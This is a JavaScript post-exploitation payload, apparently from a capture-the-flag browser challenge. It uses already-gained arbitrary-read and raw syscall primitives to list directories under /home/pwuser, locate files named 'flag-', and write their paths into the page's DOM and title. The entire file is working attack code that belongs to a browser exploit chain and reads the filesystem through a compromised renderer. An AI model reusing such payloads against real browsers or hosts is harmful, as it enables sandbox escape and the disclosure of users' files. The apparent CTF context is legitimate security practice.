// Directory listing payload - tìm flag path

log("[i] Path finder activated", 0);

if (FINGERPRINT.platform.os === "Linux") {
    try {
        // Open /home/pwuser
        let path_bytes = stringToArr("/home/pwuser");
        let path_addr = getDataAddr(path_bytes);
        let fd = syscall(2, path_addr, 0);
        
        if (fd < 0n) {
            document.body.innerHTML = "[-] Failed to open /home/pwuser";
            return;
        }
        
        // getdents64 to list
        let dirents = new Uint8Array(8192);
        let dirents_addr = getDataAddr(Array.from(dirents));
        let bytes_read = syscall(78, fd, dirents_addr, 8192n);
        syscall(3, fd);
        
        log(`[+] Read ${bytes_read} bytes from directory`, 0);
        
        // Parse entries
        let offset = 0;
        let found_flags = [];
        
        while (offset < bytes_read) {
            let reclen_addr = dirents_addr + BigInt(offset + 16);
            let reclen = Number(arbRead(reclen_addr)) & 0xFFFF;
            if (reclen === 0) break;
            
            let dtype_addr = dirents_addr + BigInt(offset + 24);
            let dtype = Number(arbRead(dtype_addr)) & 0xFF;
            
            let name_addr = dirents_addr + BigInt(offset + 25);
            let name_bytes = getStringArr(name_addr, 256);
            let name = arrToString(name_bytes);
            
            if (dtype === 4 && name.startsWith("flag-")) {
                log(`[+] Found flag dir: ${name}`, 0);
                found_flags.push("/home/pwuser/" + name);
            }
            
            offset += reclen;
        }
        
        // List inside each flag directory
        let output = "FOUND FLAG PATHS:\n\n";
        
        for (let flag_dir of found_flags) {
            let dir_bytes = stringToArr(flag_dir);
            let dir_addr = getDataAddr(dir_bytes);
            let fd2 = syscall(2, dir_addr, 0);
            
            if (fd2 < 0n) continue;
            
            let dirents2 = new Uint8Array(4096);
            let dirents2_addr = getDataAddr(Array.from(dirents2));
            let bytes2 = syscall(78, fd2, dirents2_addr, 4096n);
            syscall(3, fd2);
            
            offset = 0;
            while (offset < bytes2) {
                let reclen = Number(arbRead(dirents2_addr + BigInt(offset + 16))) & 0xFFFF;
                if (reclen === 0) break;
                
                let dtype = Number(arbRead(dirents2_addr + BigInt(offset + 24))) & 0xFF;
                let name_addr = dirents2_addr + BigInt(offset + 25);
                let name_bytes = getStringArr(name_addr, 256);
                let name = arrToString(name_bytes);
                
                if (dtype === 8 && name.startsWith("flag-")) {
                    let full_path = flag_dir + "/" + name;
                    output += full_path + "\n";
                    log(`[+] FOUND: ${full_path}`, 0);
                }
                
                offset += reclen;
            }
        }
        
        // Write to DOM
        document.body.innerHTML = "<pre style='color: #70dfb3; font-family: monospace; padding: 20px;'>" + output + "</pre>";
        document.title = output;
        
    } catch (e) {
        log(`[-] Error: ${e}`, 0);
        document.body.innerHTML = `<pre>Error: ${e}</pre>`;
    }
}
